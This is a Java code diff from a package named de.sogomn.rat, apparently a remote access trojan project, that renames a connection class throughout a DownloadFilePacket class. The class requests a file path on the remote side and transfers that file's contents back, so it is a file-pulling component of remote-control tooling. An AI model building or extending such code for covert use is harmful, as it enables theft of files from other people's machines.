@@ -3,7 +3,7 @@ package de.sogomn.rat.packet;
 import java.io.File;
 
 import de.sogomn.engine.util.FileUtils;
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class DownloadFilePacket extends AbstractPingPongPacket {
 	
@@ -25,24 +25,24 @@ public final class DownloadFilePacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void sendRequest(final ActiveClient client) {
+	protected void sendRequest(final ActiveConnection client) {
 		client.writeUTF(path);
 	}
 	
 	@Override
-	protected void sendData(final ActiveClient client) {
+	protected void sendData(final ActiveConnection client) {
 		client.writeInt(data.length);
 		client.write(data);
 		client.writeUTF(fileName);
 	}
 	
 	@Override
-	protected void receiveRequest(final ActiveClient client) {
+	protected void receiveRequest(final ActiveConnection client) {
 		path = client.readUTF();
 	}
 	
 	@Override
-	protected void receiveData(final ActiveClient client) {
+	protected void receiveData(final ActiveConnection client) {
 		final int length = client.readInt();
 		
 		data = new byte[length];
@@ -54,7 +54,7 @@ public final class DownloadFilePacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeRequest(final ActiveClient client) {
+	protected void executeRequest(final ActiveConnection client) {
 		final File file = new File(path);
 		
 		if (file.exists() && !file.isDirectory()) {
@@ -67,7 +67,7 @@ public final class DownloadFilePacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeData(final ActiveClient client) {
+	protected void executeData(final ActiveConnection client) {
 		FileUtils.writeData(fileName, data);
 	}
 	
